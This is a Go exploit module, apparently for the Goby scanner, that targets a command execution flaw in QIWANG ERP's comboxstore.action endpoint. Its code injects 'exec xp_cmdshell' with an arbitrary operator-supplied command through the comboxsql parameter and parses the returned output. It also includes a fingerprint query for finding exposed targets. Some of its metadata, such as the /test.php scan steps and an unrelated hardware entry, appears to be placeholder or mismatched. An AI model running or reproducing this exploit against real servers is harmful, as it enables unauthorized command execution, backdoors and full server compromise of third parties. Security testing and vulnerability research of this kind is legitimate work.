package exploits

import (
	"encoding/json"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>QIWANG ERP is a business management software, developed by Shanghai QIWANG Information Technology Co., LTD.</p><p>At present, there is a command execution vulnerability in ERP, and the attacker can execute arbitrary commands on the server side through this vulnerability, write the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Qiwang-ERP",
    "Homepage": "http://www.wantit.com.cn/",
    "DisclosureDate": "2023-09-18",
    "Author": "bablish",
    "FofaQuery": "body=\"/javascript/js/WITFunctions.js\"",
    "GobyQuery": "body=\"/javascript/js/WITFunctions.js\"",
    "Level": "3",
    "Impact": "<p>Attackers can arbitrarily execute code on the server side through this vulnerability, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Due to the abuse of xp_cmdshell when the command execution is triggered, xp_cmdshell should be closed if not necessary.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "cmd",
            "Type": "input",
            "Value": "ls",
            "name": "attackType",
            "value": "cmd",
            "type": "select"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "shterm-Fortres-Machine"
        ]
    },
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "VulType": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "企望 ERP comboxstore.action 文件 comboxsql 参数命令执行漏洞",
            "Product": "企望-ERP系统",
            "Description": "<p>企望 ERP 是一款企业管理软件，由上海企望信息科技有限公司开发。</p><p>当下企望 ERP 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>1、命令执行触发时由于 xp_cmdshell 的滥用，非必要的情况下应关闭 xp_cmdshell</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "QIWANG ERP comboxstore.action file comboxsql parameter command execution vulnerability",
            "Product": "Qiwang-ERP",
            "Description": "<p>QIWANG ERP is a business management software, developed by Shanghai QIWANG Information Technology Co., LTD.</p><p>At present, there is a command execution vulnerability in ERP, and the attacker can execute arbitrary commands on the server side through this vulnerability, write the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. Due to the abuse of xp_cmdshell when the command execution is triggered, xp_cmdshell should be closed if not necessary.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Attackers can arbitrarily execute code on the server side through this vulnerability, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "Name": "QIWANG ERP comboxstore.action file comboxsql parameter command execution vulnerability",
    "PostTime": "2023-09-18",
    "Is0day": false,
    "PocId": "10695"
}`
	sendPayload59gooijShsHHSOM := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/mainFunctions/comboxstore.action")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cmd = `exec xp_cmdshell ` + strconv.Quote(cmd)
		postConfig.Data = `comboxsql=` + url.QueryEscape(cmd)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			resp, _ := sendPayload59gooijShsHHSOM(hostInfo, `echo `+checkStr)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, checkStr) && !strings.Contains(resp.RawBody, `echo `)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				resp, err := sendPayload59gooijShsHHSOM(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 {
					result := strings.ReplaceAll(resp.RawBody, "'data'", "\"data\"")
					var data struct {
						Data []struct {
							Item                        string `json:"Item"`
							Value                       string `json:"Value"`
							Filter                      string `json:"Filter"`
							NOListItemPersonalFilledAll string `json:"NOListItemPersonalFilledAll"`
						} `json:"data"`
					}
					err := json.Unmarshal([]byte(result), &data)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					for _, item := range data.Data {
						cmdResult := item.Item + "\n"
						expResult.Success = true
						expResult.Output += cmdResult
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
